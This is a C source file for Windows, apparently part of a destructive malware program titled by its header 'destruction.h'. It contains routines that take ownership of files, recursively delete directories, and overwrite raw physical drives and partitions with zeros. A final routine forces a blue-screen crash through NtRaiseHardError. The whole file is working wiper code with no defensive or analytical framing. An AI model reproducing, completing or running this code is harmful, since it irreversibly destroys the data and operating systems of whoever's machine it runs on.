#include "destruction.h"

long long fnum = 0;

bool SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, bool bEnablePrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege) {
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    }
    else {
        tp.Privileges[0].Attributes = 0;
    }

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        return FALSE;
    }

    return TRUE;
}


bool TakeOwnership(LPTSTR lpszOwnFile) {
    bool bRetval = FALSE;

    HANDLE hToken = NULL;
    PSID pSIDAdmin = NULL;
    PSID pSIDEveryone = NULL;
    PACL pACL = NULL;
    SID_IDENTIFIER_AUTHORITY SIDAuthWorld =
        SECURITY_WORLD_SID_AUTHORITY;
    SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
    const int NUM_ACES = 2;
    EXPLICIT_ACCESS ea[NUM_ACES];
    DWORD dwRes;

    if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEveryone)) {
        goto Cleanup;
    }

    if (!AllocateAndInitializeSid(&SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSIDAdmin)) {
        goto Cleanup;
    }

    ZeroMemory(&ea, NUM_ACES * sizeof(EXPLICIT_ACCESS));

    ea[0].grfAccessPermissions = GENERIC_READ;
    ea[0].grfAccessMode = SET_ACCESS;
    ea[0].grfInheritance = NO_INHERITANCE;
    ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea[0].Trustee.ptstrName = (LPTSTR)pSIDEveryone;

    ea[1].grfAccessPermissions = GENERIC_ALL;
    ea[1].grfAccessMode = SET_ACCESS;
    ea[1].grfInheritance = NO_INHERITANCE;
    ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea[1].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
    ea[1].Trustee.ptstrName = (LPTSTR)pSIDAdmin;

    if (ERROR_SUCCESS != SetEntriesInAcl(NUM_ACES, ea, NULL, &pACL)) {
        goto Cleanup;
    }

    dwRes = SetNamedSecurityInfo(lpszOwnFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);

    if (ERROR_SUCCESS == dwRes) {
        bRetval = TRUE;
        goto Cleanup;
    }

    if (dwRes != ERROR_ACCESS_DENIED) {
        goto Cleanup;
    }

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        goto Cleanup;
    }

    if (!SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, TRUE)) {
        goto Cleanup;
    }

    dwRes = SetNamedSecurityInfo(lpszOwnFile, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, pSIDAdmin, NULL, NULL, NULL);

    if (dwRes != ERROR_SUCCESS) {
        goto Cleanup;
    }

    if (!SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, FALSE)) {
        goto Cleanup;
    }

    dwRes = SetNamedSecurityInfo(lpszOwnFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);

    if (dwRes == ERROR_SUCCESS) {
        bRetval = TRUE;
    }

Cleanup:

    if (pSIDAdmin)
        FreeSid(pSIDAdmin);

    if (pSIDEveryone)
        FreeSid(pSIDEveryone);

    if (pACL)
        LocalFree(pACL);

    if (hToken)
        CloseHandle(hToken);

    return bRetval;

}

void DestroyDirectory(PWSTR szDirectory) {
    TakeOwnership(szDirectory);

    if (szDirectory[wcslen(szDirectory) - 1] != '\\' && wcslen(szDirectory) < 260) {
        szDirectory[wcslen(szDirectory)] = '\\';
    }

    WCHAR szSearchDir[MAX_PATH] = { 0 };
    lstrcpy(szSearchDir, szDirectory);
    lstrcat(szSearchDir, L"*.*");

    WIN32_FIND_DATA findData;
    HANDLE hSearch = FindFirstFile(szSearchDir, &findData);

    if (hSearch == INVALID_HANDLE_VALUE) {
        return;
    }
    else do {
        if (!lstrcmpW(findData.cFileName, L".") || !lstrcmpW(findData.cFileName, L"..") || findData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
            continue;
        }

        WCHAR szPath[MAX_PATH] = { 0 };
        lstrcpy(szPath, szDirectory);
        lstrcat(szPath, findData.cFileName);

        if (fnum < LLONG_MAX) {
            fnum++;
        }

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            lstrcat(szPath, L"\\");
            DeleteDir(szPath);
            RemoveDirectory(szPath);
        }
        else if (TakeOwnership(szPath) && !(fnum % 15)) {
            DeleteFile(szPath);
        }
    } while (FindNextFile(hSearch, &findData));

    FindClose(hSearch);
}

void WriteBlankDataToFile(LPCWSTR lpszFileName) {
    HANDLE hFile = CreateFile(lpszFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    unsigned char* data = (unsigned char*)LocalAlloc(LMEM_ZEROINIT, 512000);
    DWORD dwUnused;
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    for (ULONGLONG i = 0; i <= 1000; i++) {
        WriteFile(hFile, data, 512000, &dwUnused, NULL);
        SetFilePointer(hFile, 512000, NULL, FILE_CURRENT);
    }
    CloseHandle(hFile);
}

void WriteDisk() {
    WriteBlankDataToFile(L"\\\\.\\PhysicalDrive0");
    WriteBlankDataToFile(L"\\\\.\\PhysicalDrive1");
    WriteBlankDataToFile(L"\\\\.\\PhysicalDrive2");
    WriteBlankDataToFile(L"\\\\.\\C:");
    WriteBlankDataToFile(L"\\\\.\\D:");
    WriteBlankDataToFile(L"\\\\.\\E:");
    WriteBlankDataToFile(L"\\\\.\\Harddisk0Partition1");
    WriteBlankDataToFile(L"\\\\.\\Harddisk0Partition2");
    WriteBlankDataToFile(L"\\\\.\\Harddisk0Partition3");
    WriteBlankDataToFile(L"\\\\.\\Harddisk0Partition4");
    WriteBlankDataToFile(L"\\\\.\\Harddisk0Partition5");
    WriteBlankDataToFile(L"\\\\.\\Harddisk1Partition1");
    WriteBlankDataToFile(L"\\\\.\\Harddisk1Partition2");
    WriteBlankDataToFile(L"\\\\.\\Harddisk1Partition3");
    WriteBlankDataToFile(L"\\\\.\\Harddisk1Partition4");
    WriteBlankDataToFile(L"\\\\.\\Harddisk1Partition5");
    WriteBlankDataToFile(L"\\\\.\\Harddisk2Partition1");
    WriteBlankDataToFile(L"\\\\.\\Harddisk2Partition2");
    WriteBlankDataToFile(L"\\\\.\\Harddisk2Partition3");
    WriteBlankDataToFile(L"\\\\.\\Harddisk2Partition4");
    WriteBlankDataToFile(L"\\\\.\\Harddisk2Partition5");
}

void CrashWindows() {
    HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
    VOID(*RtlAdjustPrivilege)(DWORD, DWORD, BOOLEAN, LPBYTE) = (VOID(*)(DWORD, DWORD, BOOLEAN, LPBYTE))GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    VOID(*NtRaiseHardError)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD) = (void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))GetProcAddress(hNtdll, "NtRaiseHardError");
    unsigned char unused1;
    long unsigned int unused2;
    RtlAdjustPrivilege(0x13, true, false, &unused1);
    NtRaiseHardError(0xdead6666, 0, 0, 0, 6, &unused2);
    FreeLibrary(hNtdll);
}